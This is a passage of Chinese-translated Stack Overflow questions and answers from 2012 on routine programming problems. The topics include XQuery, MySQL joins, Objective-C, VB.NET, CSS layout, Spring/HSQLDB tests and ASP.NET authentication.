        <Title>B3</Title>
        <Year>2012</Year>
    </Book>
</Books> 
```

我将通过我的 xQuery 代码获得两个 AAA。我想知道我是否可以获得不同的结果，这意味着只有一个 AAA。我已经尝试过 distinct-value() 但可能不知道如何使用它。感谢您的回复！

----我为 xQuery 1.0 使用 XML 格式更新的解决方案----

```
<root>
{
    for $x in distinct-values
    (
        for $r in doc("review.xml")//Reviews//Review,
            $b in doc("book.xml")//Books//Book
        where $b/Title = $r/BookTitle
            and $b/Year > 2010
        return {$r/Reviewer}
    )
    return <reviewer>{$x}</reviewer>
}
</root> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T19:59:08.753

以下查询将为您提供所有不同的审阅者名称（请注意，这些值是原子化的，这意味着元素节点已被删除）：

```
distinct-values(
  for $r in doc("review.xml")//Reviews//Review,
      $b in doc("book.xml")//Books//Book
  where $b/Title = $r/BookTitle
    and $b/Year > 2010
  return $r/Reviewer
) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T20:49:32.037

要保留节点，您可以使用“group by”子句并选择组序列的第一项：

```
for $r in doc("review.xml")//Review,
    $b in doc("book.xml")//Book
let $n := $r/Reviewer
where $b/Title = $r/BookTitle
  and $b/Year > 2010
group by $n
return $r[1]/Reviewer 
```

# c++ - 未定义参考 boost::program_options::abstract_variables_map::operator[]

> ID：10078784
> 
> 赞同：0
> 
> 时间：2012-04-09T19:41:30.180
> 
> 标签：c++, linux, boost, linker, boost-program-options

当我将 program_options 链接到我的共享库时：

```
g++ -L/path_to_static_boost_libs -shared -o "test.so"  ./test.o   -lboost_program_options 
```

由于 abstract_variables_map::operator[] 上的未定义引用，我无法加载库：

```
0009b9f8 W int const& boost::program_options::variable_value::as<int>() const
         U boost::program_options::abstract_variables_map::operator[](std::string const&) const
0009b55e W boost::exception_detail::clone_impl<boost::exception_detail::error_info_injector<boost::bad_any_cast> >::clone() const 
```

我尝试使用静态链接的 program_options 库构建另一个程序（不是共享库），但没有得到未定义的引用。

为什么我在链接共享库时得到未定义的引用？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T04:08:29.220

第 1 步：找出未解析符号的*错位*名称（应该已经显示在`dlerror()`错误消息中）。

第 2 步：找出*哪些*boost 库为该符号提供了定义：

```
nm -A /path_to_static_boost_libs/*.a | grep <mangled-symbol-name> 
```

第 3 步：将该库添加到`test.so`.

第四步：盈利。

# mysql - 获取库存余额

> ID：10078788
> 
> 赞同：0
> 
> 时间：2012-04-09T19:41:34.690
> 
> 标签：mysql, join, sum

我有3个表如下：

```
products:[product_id,product_name]
stock:[product_id,date,qty_received]
sales:[product_id,date,qty_sold] 
```

我试图通过减去 qty_received - qty_sold 来显示所有产品的余额。我的查询是：

```
SELECT DISTINCT p.product_id, p.product_name,
IFNULL(sum(qty_received),0)-IFNULL(sum(qty_sold),0) as balance FROM products p
LEFT JOIN stock st ON (p.product_id=st.product_id)
LEFT JOIN sales sa ON (p.product_id=sa.product_id)
GROUP BY p.product_id 
```

通过上述查询，我​​没有得到正确的平衡。能否请你帮忙。

附加信息：以下是我的表 Products 表的简化结构：

```
CREATE TABLE IF NOT EXISTS `products` (
  `product_id` varchar(15) NOT NULL,
  `product_name` varchar(20) NOT NULL,
  UNIQUE KEY `product_id` (`product_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1; 
```

-- 为表转储数据`products`

```
INSERT INTO `products` (`product_id`, `product_name`) VALUES
  ('111', 'Product One'),
  ('222', 'Product Two'),
  ('333', 'Product Three'),
  ('444', 'Product Four'); 
```

库存表：

```
CREATE TABLE IF NOT EXISTS `stock` (
  `stock_id` int(11) NOT NULL AUTO_INCREMENT,
  `product_id` int(11) NOT NULL,
  `qty_received` int(11) NOT NULL,
  PRIMARY KEY (`stock_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=112 ; 
```

-- 为表转储数据`stock`

```
INSERT INTO `stock` (`stock_id`, `product_id`, `qty_received`) VALUES
  (1, 111, 5),
  (2, 222, 10),
  (3, 333, 4),
  (4, 444, 6),
  (5, 111, 2),
  (6, 222, 7),
  (7, 111, 3),
  (8, 111, 3); 
```

销售表

```
CREATE TABLE IF NOT EXISTS `sales` (
  `sales_id` int(11) NOT NULL AUTO_INCREMENT,
  `product_id` int(11) NOT NULL,
  `qty_sold` int(11) NOT NULL,
  PRIMARY KEY (`sales_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=7 ; 
```

-- 为表转储数据`sales`

```
INSERT INTO `sales` (`sales_id`, `product_id`, `qty_sold`) VALUES
  (1, 111, -1),
  (2, 222, -3),
  (3, 333, -2),
  (4, 111, -3),
  (5, 222, -1),
  (6, 222, -4); 
```

我得到的结果是：

```
+------------+--------------+---------+
| product_id | product_name | balance |
+------------+--------------+---------+
| 111        | Product One  | 10      |
| 222        | Product Two  | 35      |
| 333        | Product Three| 2       |
| 444        | Product Four | 6       |
+------------+--------------+---------+ 
```

我期望的正确平衡是

```
+------------+--------------+---------+
| product_id | product_name | balance |
+------------+--------------+---------+
| 111        | Product One  | 9       |
| 222        | Product Two  | 9       |
| 333        | Product Three| 2       |
| 444        | Product Four | 6       |
+------------+--------------+---------+ 
```

终于得到了这个解决方案的工作 sql，但不确定这是否是最好的方法。我非常关心性能，因为这些表有大量记录。

```
SELECT p.product_id,p.product_name,
IFNULL(sum(st.qty_received),0)+IFNULL(sold,0) as balance FROM products p
  LEFT JOIN stock st ON (p.product_id=st.product_id)
  LEFT JOIN (SELECT sa.product_id,sum(sa.qty_sold) as sold FROM sales sa 
     GROUP BY sa.product_id) as t1 ON (t1.product_id=p.product_id)
GROUP BY product_id 
```

任何人都可以建议更好的 sql（或架构更改）以获得更好的速度/性能来获得库存平衡？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T19:46:24.877

首先，添加`p.product_name`到`GROUP BY`子句。

其次，删除`DISTINCT`- 没有必要使用`GROUP BY`.

**更新**

我尝试了几个查询，发现这个看起来最简单：

```
SELECT 
  p.product_id, 
  p.product_name,
  COALESCE(SUM(qty), 0) as balance 
FROM products p 
LEFT JOIN (
    SELECT product_id, qty_received AS qty FROM stock st UNION ALL 
    SELECT product_id, qty_sold FROM sales st
) AS T 
  ON p.product_id = T.product_id
GROUP BY 
  p.product_id, 
  p.product_name 
```

另外，我认为让`product_id`所有表中的数据类型相同是个好主意。它`varchar`在里面`products`和里面`int`。`sales/stock`

我为你做了一个[小提琴](http://www.sqlfiddle.com/#!2/114d5/1)

# objective-c - 基于值数组将 NSString 转换为 NSInteger 的最佳方法是什么？

> ID：10078793
> 
> 赞同：0
> 
> 时间：2012-04-09T19:41:51.643
> 
> 标签：objective-c, ios, type-conversion

我想根据预定值将字符转换为整数，例如：

```
a = 0 
b = 1
c = 2
d = 3 
```

ETC...

现在我正在使用 If/Else If，我只想知道是否有更快/更好的方法我应该这样做，因为转换列表可能会很长。

这是我现在使用的：

```
-(NSInteger)ConvertToInt:(NSString *)thestring {
    NSInteger theint;
    if([thestring isEqualToString:@"a"] == YES){
        theint = 0;
    } else if ([thestring isEqualToString:@"b"] == YES){
        theint = 1;
    } //etc...

    return theint;
} 
```

这很好用，但正如我所说，如果它更有意义，我可以创建一个包含所有键/值的数组，然后通过它返回整数吗？

请提供示例，因为我是 Objective C/iOS 的初学者。我来自网络语言。

谢谢！

编辑：感谢大家的帮助。我使用了 taskinoors 的答案，但我用这个替换了给出错误消息的 NSDictionary：

```
NSDictionary *dict;
dict = [NSDictionary dictionaryWithObjectsAndKeys:
        [NSNumber numberWithInt:0], @"a",
        [NSNumber numberWithInt:1], @"b",
        [NSNumber numberWithInt:2], @"c", nil]; 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-09T19:45:49.663

```
unichar ch = [thestring characterAtIndex:0];
theint = ch - 'a'; 
```

请注意，`'a'`单引号是 character `a`，而不是 string `"a"`。

如果值不像您的示例那样常规，那么您可以将所有预定义值存储到字典中。例如：

```
"a" = 5;
"b" = 1;
"c" = 102;

NSArray *values = [NSArray arrayWithObjects:[NSNumber numberWithInt:5],
    [NSNumber numberWithInt:1], [NSNumber numberWithInt:102], nil];
NSArray *keys = [NSArray arrayWithObjects:@"a", @"b", @"c", nil];
NSDictionary *dic = [NSDictionary dictionaryWithObjects:values forKeys:keys];

theint = [[dic valueForKey:thestring] intValue]; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T19:50:51.050

如果您想在哪些字符串映射到哪些整数方面保持一定的灵活性，并且您的整数从 0 到 n-1 运行，其中数组中有 n 个唯一项，您可以执行以下操作：

```
-(NSInteger)ConvertToInt:(NSString *)thestring {
    NSArray *arr = [NSArray arrayWithObjects:@"a", @"b", @"c", @"d", nil];
    NSInteger theint = [arr indexOfObject:thestring];
    return theint;
} 
```

现在这将每次构建数组，这将非常低效，最佳方法是在您的类中构建一次数组，然后只需使用 indexOfObject 方法调用对该数组的引用。

# vb.net - 如何创建一个显示一定数量标签的循环？

> ID：10078795
> 
> 赞同：1
> 
> 时间：2012-04-09T19:42:02.490
> 
> 标签：vb.net

我希望能够显示并填充一定数量的标签。低效的方法是在所需标签的数量上选择 CASE，然后依次填充这些标签。我正在寻找这样的东西：

```
For i = 1 to RequiredNumOfLabels
    Label & i.visible = true
    Label & i.text = DataTable.Rows(i).Item(2)
Next 
```

谢谢你。

编辑：

```
 For i = 1 To NumberOfItems
        Dim lbl = Controls("lbl" & i)
        lbl.Visible = True
        lbl.Text = CStr(DataTable.Rows(i).Item(2))
    Next 
```

我认为这条线

```
 Dim lbl = Controls("lbl" & i) 
```

是问题，因为在执行该行之后， lbl 仍然等于什么。

其背后的原因是我试图在 vb.net 中创建一个发票生成器，我希望这是一种简单的方法 - 计算订单中的项目数量，用名称填充标签物品，露出那么多标签。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T19:59:48.750

如果您的标签控件确实如此，您可以尝试从列表中引用它们：

```
Dim myLabels As New List(Of Label)
myLabels.Add(Label1)
myLabels.Add(Label2) 
```

然后只需更新它们：

```
For i as Integer = 1 to myLabels.Count
  myLabels(i - 1).Visible = True
  myLabels(i - 1).Text = DataTable.Rows(i).Item(2).ToString
Next 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T19:57:25.140

您可以通过 forms`Controls`属性按名称获取控件

```
For i = 1 To RequiredNumOfLabels
    Dim lbl = TryCast(Controls("Label" & i), Label)
    If lbl IsNot Nothing Then
        lbl.Visible = True
        lbl.Text = CStr(DataTable.Rows(i).Item(2))
    End If
Next 
```

既然你得到一个类型的对象`Control`，你必须把它强制转换为`Label`.

* * *

更新

看来您只使用`Control`无论如何定义的属性。因此，您可以将代码简化为

```
For i = 1 To RequiredNumOfLabels
    Dim lbl = Controls("Label" & i)
    lbl.Visible = True
    lbl.Text = CStr(DataTable.Rows(i).Item(2))
Next 
```

# css - CSS浮动“拥抱中心”？

> ID：10078796
> 
> 赞同：0
> 
> 时间：2012-04-09T19:42:03.707
> 
> 标签：css, html, css-float, margins

我有两个不同的 div，一个向左浮动，一个向右浮动。它们比整个页面小得多（每个大约 400x200），因此两者相距很远，紧贴页面的边缘。我怎样才能让它们在中心彼此相邻？我尝试将边距分别设置为自动和大约 20px，但它没有改变任何东西..

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T19:47:57.993

这是一份工作`inline-block`！

[http://jsfiddle.net/hyw6P/](http://jsfiddle.net/hyw6P/)

```
<div id="container">
    <div id="left">Left!</div>
    <div id="right">Right!</div>
</div>​

#container{
text-align:center;
width:100%;
height:300px;
border:1px solid black
}
#left{
border:3px solid blue;
height:100px;
width:100px;
margin:auto;
display:inline-block;
}
#right{
border:3px solid red;
height:100px;
width:100px;
margin:auto;
display:inline-block;
}​ 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T19:47:27.270

给他们一个带有“margin: 0 auto; width:1000px;”的父 div

```
<div style="margin:0 auto; width:1000px;">
     <div style="float:left">Left</div>
     <div style="float:right">Right</div>
</div> 
```

或者，如果您希望它们彼此相邻：

```
<div style="margin:0 auto;">
     <div style="float:left">Left</div>
     <div style="float:left">Right</div>
</div> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T19:50:36.763

您可以使用包装 div 并将子 div 设置为显示为内联块来完成此操作。

CSS：

```
#a, #b{
    border: 1px solid #999;
    width: 100px;
    display:inline-block;
}
​#container {
    text-align:center;
}​ 
```

HTML：

```
<div id="container">
    <div id="a">a</div>
    <div id="b">b</div>
</div> 
```

**[jsFiddle 示例](http://jsfiddle.net/j08691/5CtNd/)**。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-09T19:48:25.907

在它们周围添加一个包装器 div。在包装器上设置一个宽度，并将顶部和底部边距设置为 0，将左右边距设置为自动。然后设置两个浮动 div 的宽度以适合包装器，例如 50% 将使它们具有相同的宽度。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-09T19:48:34.870

尝试使用 z-index 和位置绝对值或相对值

这是一个帮助你的链接

```
<div style="position: absolute; left: 610px; top: 80px; height: 400px; width: 100px; padding: 1em;">layer stuff</div> 
```

[http://www.yourhtmlsource.com/stylesheets/csslayout.html](http://www.yourhtmlsource.com/stylesheets/csslayout.html)

[http://www.w3schools.com/html/default.asp](http://www.w3schools.com/html/default.asp)

[http://www.w3schools.com/html/default.asp](http://www.w3schools.com/html/default.asp)

# objective-c - NSDateFormatter 错误从字符串转换日期

> ID：10078797
> 
> 赞同：-1
> 
> 时间：2012-04-09T19:42:04.033
> 
> 标签：objective-c, nsdateformatter

我有一个 NSString 格式的日期，内容如下：29/02/2012 12:00:00 AM

我正在尝试将其转换为 NSDate 对象，以便使用以下方法进行比较：

```
 NSDateFormatter *df = [[NSDateFormatter alloc] init];
    [df setDateFormat:@"dd/MM/yyyy hh:mm:ss"]; 
```

但是当我使用 dateFromString: 方法时，我得到一个空值。

我错过了什么？

谢谢。

-编辑-

```
 NSDateFormatter *df = [[NSDateFormatter alloc] init];
    [df setDateFormat:@"dd/MM/yyyy hh:mm:ss a"];

    NSLog(@"INFO -> Test Date: %@",[df dateFromString:testQuestions.endDate]);
    NSLog(@"INFO -> Test Date String: %@",testQuestions.endDate);

    if ([[df dateFromString:testQuestions.endDate] earlierDate:[NSDate date]])
    {
        currentTestIsBeingSolved = NO;
    } 
```

日志：

```
2012-04-09 22:15:29.073 Otsuka On[27184:707] INFO -> Test Date: (null)
2012-04-09 22:15:31.816 Otsuka On[27184:707] INFO -> Test Date String: 29/02/2012 12:00:00 AM 
```

编辑 -

正如@trudyscousin 建议的那样，我已经开始了一个新项目并添加了这个：

```
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
    NSDateFormatter *df = [[NSDateFormatter alloc] init];
    [df setDateFormat:@"dd/MM/yyyy hh:mm:ss a"];

    NSLog(@"INFO -> Test Date: %@",[df dateFromString:@"29/02/2012 12:00:00 AM"]);
... 
```

现在我没有得到 null 但日期不一样：

```
2012-04-09 22:26:19.189 TestDate[54705:207] INFO -> Test Date: 2012-02-28 23:00:00 +0000 
```

日期怎么了？

Xcode中的任何配置？

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T19:47:12.743

您在日期和时间后面加上“AM”这一事实就是这样做的。您还必须为此提供：

```
@"dd/MM/yyyy hh:mm:ss a" 
```

# python - 如何在cygwin下的python中构建gevent？

> ID：10078798
> 
> 赞同：1
> 
> 时间：2012-04-09T19:42:06.447
> 
> 标签：python, cygwin, pip, gevent, libevent

我想在各种环境中始终如一地使用 python。其中一种环境是cygwin。我想使用的组件之一是 gevent (http://www.gevent.org/intro.html)。在 cygwin 下，我运行了 python 2.7（在本地构建，此处描述了一行更改，这是构建所需的：[http](http://www.gossamer-threads.com/lists/python/python/976956) ://www.gossamer-threads.com/lists/python/python/976956 ）。

gevent 需要 libevent (http://libevent.org/)。

libevent 似乎在 cygwin 下构建得很好（./configure && make && make install）。

但是，在构建 gevent (pip install gevent) 时，它会失败，因为 libevent 构建了静态库（例如 /usr/local/lib/libevent.a）并且 gevent 构建需要共享库。因此：

```
gcc -shared -Wl,--enable-auto-image-base build/temp.cygwin-1.7.13-i686-2.7/gevent/core.o -L/usr/local/lib/python2.7/config -levent -lpython2.7 -o build/lib.cygwin-1.7.13-i686-2.7/gevent/core.dll

/usr/lib/gcc/i686-pc-cygwin/3.4.4/../../../../i686-pc-cygwin/bin/ld: cannot find -levent 
```

同时，如果我尝试让 gevent 静态链接（CFLAGS='-static' pip install gevent），-levent 仍然失败，以及许多关于取消引用类型双关指针将如何破坏严格别名规则和一些额外的 ld 失败的警告：

gevent/core.c:21835：警告：取消引用类型双关指针将破坏严格别名规则

```
....
gevent/core.c:21836: warning: dereferencing type-punned pointer will break strict-aliasing rules

gcc -shared -Wl,--enable-auto-image-base -static build/temp.cygwin-1.7.13-i686-2.7/gevent/core.o -L/usr/local/lib/python2.7/config -levent -lpython2.7 -o build/lib.cygwin-1.7.13-i686-2.7/gevent/core.dll

/usr/lib/gcc/i686-pc-cygwin/3.4.4/../../../../i686-pc-cygwin/bin/ld: cannot find -levent

/usr/lib/gcc/i686-pc-cygwin/3.4.4/../../../../i686-pc-cygwin/bin/ld: cannot find -lpython2.7 
```

... 所以...

我想我需要告诉 libevent 构建 .dll 而不是 .a，但 libevent 的 Makefile 实际上并没有 .a 目标，而且我不清楚要如何更改所使用的抽象来实现这一点。

所以，退一步：如何在cygwin下的python 2.7下安装gevent？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T20:00:36.470

[您可以从http://code.google.com/p/gevent/downloads/list](http://code.google.com/p/gevent/downloads/list)尝试测试版吗？

它不需要任何外部依赖项。

# asp.net - 页面未重定向

> ID：10078804
> 
> 赞同：1
> 
> 时间：2012-04-09T19:42:39.073
> 
> 标签：asp.net, vb.net, asp.net-mvc-2

我遇到了 ASP.net 重定向问题。

下面的`Copy()`方法是从带有 ajax 的网格中的 javascript 按钮调用的，它工作正常。它重定向到`Create`控制器的操作。

```
<AcceptVerbs(HttpVerbs.Post)> _
Sub Copy(ByVal noDemande As Integer)
    Response.Redirect("/DemandeDeMontage/Create/" & noDemande)
End Sub 
```

该`Create`操作是一个页面，可让我在将字段保存到数据库之前对其进行编辑。当 an`Id`通过时，这些字段将预先填充另一条记录的信息（复制信息）。

```
<AcceptVerbs(HttpVerbs.Get)> _
Function Create(Optional ByVal id As Integer? = Nothing) As ActionResult
    If (id Is Nothing) Then
        Dim dmd As New DEMND_MONTG
        Return View("Edit", dmd)
    Else
        Dim dmd As ODCT0124_DEMND_MONTG = _dmdMontRep.getDmdById(id)
        dmd.CO_STAT = ModuleCommon.Status.AwaitingSave
        Return View("Edit", dmd)
    End If
End Function 
```

上面的代码没有错误。

调试时，一切似乎都正常。该`Copy`操作被调用，然后`Create`，然后我可以单步执行 HTML 代码而`Edit page`不会出现任何错误。

但是，页面**不会改变**！这就像我根本没有重定向。编辑页面未显示，我被困在显示网格的页面上，其中包含我可以复制的所有记录。

**有人可以解释为什么不显示编辑页面吗？**有什么我没有看到的非常明显的东西吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-13T14:08:07.553

这对我来说是一个愚蠢的错误。

该`Copy`操作是通过调用的`AJAX`，但我忘记指定如何处理`html`从操作返回的内容。

我现在正在使用`window.location = "/DemandeDeMontage/Copy/" + id`。

# java - 在 Spring 3 jUnit 测试的语句中找不到 HSQLDB 表

> ID：10078812
> 
> 赞同：4
> 
> 时间：2012-04-09T19:43:15.350
> 
> 标签：java, sql, spring, junit, hsqldb

我有两个 jUnit 测试类，一个用于测试我的`ItemService`类，另一个用于测试我的`LocationService`类。当我运行`ItemService`测试时，它通过了。当我运行`LocationService`测试时，它失败了：

> 原因：java.sql.SQLException：在 org.hsqldb.jdbc.Util.throwError(Unknown Source) at org.hsqldb.jdbc.jdbcPreparedStatement.(Unknown Source) 的语句 [SELECT COUNT(*) FROM locations] 中找不到表在 org.hsqldb.jdbc.jdbcConnection.prepareStatement（未知来源）

我有一个模式文件被加载到数据库中，它创建的第一个表就是`ItemService`使用的表。也许`locations`我的测试使用的表`LocationService`没有被创建，即使它在同一个模式文件中？

这是在我的 test-context.xml 文件中：

```
<jdbc:embedded-database
    id="myTestDB"
    type="HSQL">
    <jdbc:script
        location="classpath:/test-ddl.sql" />
    <jdbc:script
        location="classpath:/test-data.sql" />
</jdbc:embedded-database>

<bean
    id="dataSourceTest"
    class="org.apache.commons.dbcp.BasicDataSource"
    destroy-method="close">
    <property
        name="driverClassName"
        value="org.hsqldb.jdbcDriver" />
    <property
        name="url"
        value="jdbc:hsqldb:mem:myTestDB" />
    <property
        name="username"
        value="sa" />
    <property
        name="password"
        value="" />
</bean> 
```

我不明白为什么一个测试通过而没有关于`items`表丢失的错误，而另一个测试失败，因为`locations`数据库中不存在。我看到其他有关使用 HSQLDB 和 Hibernate 的帖子，但我没有使用 Hibernate。这些是我在 test-ddl.sql 文件中创建的表：

```
CREATE MEMORY TABLE "ITEMS" (
    "ID" INTEGER NOT NULL IDENTITY,
    "NAME" VARCHAR(50) NOT NULL,
    "LOCATION_ID" INTEGER NOT NULL,
    "ITEM_TYPE_ID" INTEGER NOT NULL
);

CREATE MEMORY TABLE "ITEM_TYPES" (
    "ID" INTEGER NOT NULL IDENTITY,
    "NAME" VARCHAR(50) NOT NULL,
    "ICON_CLASS" VARCHAR(50)
);

CREATE CACHED TABLE "LOCATIONS" (
    "ID" INTEGER NOT NULL IDENTITY,
    "NAME" VARCHAR(50) NOT NULL,
    "PHOTO" LONGVARBINARY,
    "PHOTO_CONTENT_TYPE" VARCHAR(60),
    "PHOTO_WIDTH" INTEGER,
    "PHOTO_HEIGHT" INTEGER
); 
```

在表创建语句之后，我还在模式中设置了一些`UNIQUE`和`FOREIGN KEY`约束，但它肯定会告诉我它是否无法创建某些东西。我正在使用 HSQLDB 1.8.1.3 JAR。为什么我不能查询`locations`，但我可以查询`items`？

**编辑：**基于[this question](https://stackoverflow.com/questions/3121128/problems-with-escaping-table-and-field-names-in-derby-and-hsqldb)的想法可能存在区分大小写的问题，但即使尝试从`LOCATIONS`表中选择也会失败：

> 原因：java.sql.SQLException: Table not found in statement [SELECT COUNT(*) FROM LOCATIONS]

**编辑：**我的神奇工作`ItemService`测试：

```
@ContextConfiguration("/test-context.xml")
@RunWith(SpringJUnit4ClassRunner.class)
@TransactionConfiguration(transactionManager = "transactionManager")
public class ItemServiceTest {
    private EmbeddedDatabase _db;
    private ItemService _svc;

    @Before
    public void setUp() throws Exception {
        _db = new EmbeddedDatabaseBuilder().setType(EmbeddedDatabaseType.HSQL)
            .setName("myTestDB").build();
        assertThat(_db, is(notNullValue()));
        _svc = new ItemService();
        _svc.setDataSource(_db);
    }

    @After
    public void tearDown() throws Exception {
        _db.shutdown();
    }

    @Test
    public void testGetCount() {
        assertThat(_svc.getCount(), is(not(0)));
    }
} 
```

我的失败`LocationService`测试是完全相同的，但用`LocationService`而不是`ItemService`. 该`getCount()`方法同时出现在`LocationService`和 中`ItemService`：

```
public int getCount() {
    String sql = "SELECT COUNT(*) FROM " + TABLE_NAME;
    return _jdbcTmpl.queryForInt(sql, (Map<String, Object>)null);
} 
```

之间的`TABLE_NAME`变化`ItemService`：

```
public static final String TABLE_NAME = "ITEMS"; 
```

和`LocationService`：

```
public static final String TABLE_NAME = "LOCATIONS"; 
```

两者都`ItemService`具有`LocationService`以下内容：

```
private NamedParameterJdbcTemplate _jdbcTmpl;

@Resource(name = "dataSource")
public void setDataSource(DataSource dataSource) {
    _jdbcTmpl = new NamedParameterJdbcTemplate(dataSource);
} 
```

**编辑：**问题的新转折。在我的`LocationService`测试中，我还有其他一些尚未充实的测试方法，例如

```
@Test
public void testFind() {
    fail("Not yet implemented");
} 
```

在我的`ItemService`测试中，唯一的`@Test`方法是`testGetCount`通过。当我将上述内容添加`testFind`到`ItemService`测试类时，它突然`testGetCount`像在我的`LocationService`测试类中一样失败：

> 原因：java.sql.SQLException: Table not found in statement [SELECT COUNT(*) FROM ITEMS]

**编辑：**当我不使用`static` `@BeforeClass`/`@AfterClass`方法时（即，当测试找不到表时）逐步使用调试器，我注意到以下控制台输出：

> 2012 年 4 月 10 日上午 10:22:44 org.springframework.jdbc.datasource.embedded.EmbeddedDatabaseFactory initDatabase INFO：创建嵌入式数据库“myTestDB” 2012 年 4 月 10 日上午 10:22:44 org.springframework.jdbc.datasource.init。 ResourceDatabasePopulator executeSqlScript INFO：从类路径资源执行 SQL 脚本 [test-ddl.sql] Apr 10, 2012 10:22:44 AM org.springframework.jdbc.datasource.init.ResourceDatabasePopulator executeSqlScript INFO：完成从类路径资源执行 SQL 脚本[test-ddl.sql] 在 30 毫秒内。2012 年 4 月 10 日上午 10:22:44 org.springframework.jdbc.datasource.init.ResourceDatabasePopulator executeSqlScript 信息：从类路径资源 [test-data.sql] 执行 SQL 脚本 2012 年 4 月 10 日上午 10:22:44 springframework.jdbc.datasource.init.ResourceDatabasePopulator 执行SqlScript 信息：在 46 毫秒内完成从类路径资源 [test-data.sql] 执行 SQL 脚本。2012 年 4 月 10 日上午 10:22:55 org.springframework.jdbc.datasource.embedded.EmbeddedDatabaseFactory initDatabase INFO：创建嵌入式数据库“myTestDB” 2012 年 4 月 10 日上午 10:23:08 org.springframework.jdbc.datasource.embedded。 EmbeddedDatabaseFactory initDatabase INFO：创建嵌入式数据库“myTestDB”

所以看起来它设置了数据库并最初运行我的 create-tables 和 populate-tables 脚本，然后在我重新初始化之后的任何时间`_db`，脚本不会再次运行。因此，对于后续测试方法，这些表不存在。因此，如果我能找到一种方法来强制 Spring 每次都重新运行这些脚本，我就可以重新使用实例方法来设置和拆卸方法`@Before`。`@After`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-10T14:40:55.353

[`addScript`](http://static.springsource.org/spring/docs/3.0.x/javadoc-api/org/springframework/jdbc/datasource/embedded/EmbeddedDatabaseBuilder.html#addScript%28java.lang.String%29)是答案。我从我的 test-context.xml 中删除了初始化脚本，所以我的`jdbc:embedded-database`标签看起来像：

```
<jdbc:embedded-database
    id="myTestDB"
    type="HSQL" /> 
```

在我`setUp()`的测试类的方法中，我将`_db`初始化更改为：

```
_db = new EmbeddedDatabaseBuilder().setType(EmbeddedDatabaseType.HSQL)
    .setName("myTestDB").addScript("test-ddl.sql")
    .addScript("test-data.sql").build(); 
```

我的`setUp`和`tearDown`方法仍然是实例方法，分别用`@Before`和注释`@After`。使用调试器，我看到每个测试的控制台输出表明我的两个初始化 SQL 脚本已运行，因此每个测试都存在表。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T20:36:21.830

`@BeforeClass`和`static`！我将测试类更改为具有以下设置和拆卸方法：

```
private static EmbeddedDatabase _db;
private static LocationService _svc;

@BeforeClass
public static void setUp() throws Exception {
    _db = new EmbeddedDatabaseBuilder().setType(EmbeddedDatabaseType.HSQL)
        .setName("myTestDB").build();
    assertThat(_db, is(notNullValue()));
    _svc = new LocationService();
    _svc.setDataSource(_db);
}

@AfterClass
public static void tearDown() throws Exception {
    _db.shutdown();
} 
```

现在我的测试`ItemService`和`LocationService`测试都通过了，即使在课堂上还有其他测试。我之前遇到的“表未在语句中找到”错误似乎有点奇怪，因为响应之前的每次测试设置与[之前的所有](http://junit.sourceforge.net/doc/faq/faq.htm#organize_3)测试设置相比......

# c# - C# MVC 站点强制用户重新认证

> ID：10078815
> 
> 赞同：2
> 
> 时间：2012-04-09T19:43:26.957
> 
> 标签：c#, asp.net-mvc, forms-authentication

我有一个使用 Forms 身份验证的 C# MVC 3 框架编写的网站。该站点允许匿名查看其大部分内容，但有一个包含 PDF 文档的目录，需要用户通过身份验证才能查看。

这几乎一直有效，但偶尔经过身份验证的用户会遇到问题。当他们单击文档时，他们会反复被重定向到登录屏幕，迫使他们重新进行身份验证。一旦他们这样做，他们就会被重定向到文档。不是一场彻底的灾难，但对用户来说仍然很烦人。另一种情况是经过身份验证的用户可以很好地打开一个 PDF 文档，但是如果他们单击该文档中的链接将他们重定向到同一目录中的另一个 PDF 文档，系统将强制他们重新进行身份验证。

我最初认为这可能是浏览器/cookie 问题，但从我通过与有此问题的用户交谈所收集到的信息来看，它可能发生在 Firefox 或 IE 上，并且启用了历史记录/cookie。几个月前，我在一家酒店使用他们的公共 WI-FI 时也遇到过这个问题，但我从未在工作中使用办公室连接或在家中遇到过这个问题。

该网站允许匿名用户访问，但 PDF 文档所在的目录包含以下 web.config 文件：

```
<?xml version="1.0"?>
<configuration>
   <system.web>
      <authentication>
         <deny users=”?” />
      </authentication>
   </system.web>
</configuration> 
```

我完全不知道这些用户可能会发生什么。任何想法都会非常有帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-10T23:45:29.793

应用程序是否部署在场中？我见过这样的间歇性问题，当其中一个节点与其他节点没有相同的 MachineKey 时。

# php - 在 PHP 中映射路线的最简单方法

> ID：10078816
> 
> 赞同：2
> 
> 时间：2012-04-09T19:43:27.243
> 
> 标签：php, map, routing, routes

我正在浏览 Symfony 的网站。我真的不觉得我需要框架提供的所有功能，但我确实喜欢路由部分。它允许您像这样指定 URL 模式

```
/some/path/{info} 
```

现在对于像`www.somewebsite.com/app.php/some/path/ANYTHING`它这样的 URL，它允许您向客户端发送特定于该 URL 的响应。您也可以使用字符串 ANYTHING 并将其用作 GET 参数。还有一个选项可以隐藏 URL 的 app.php 部分，这让我们的 URL 像`www.somewebsite.com/some/path/ANYTHING`. 我的问题是没有复杂框架的最佳方法是什么？

* * *

## 回答 #1

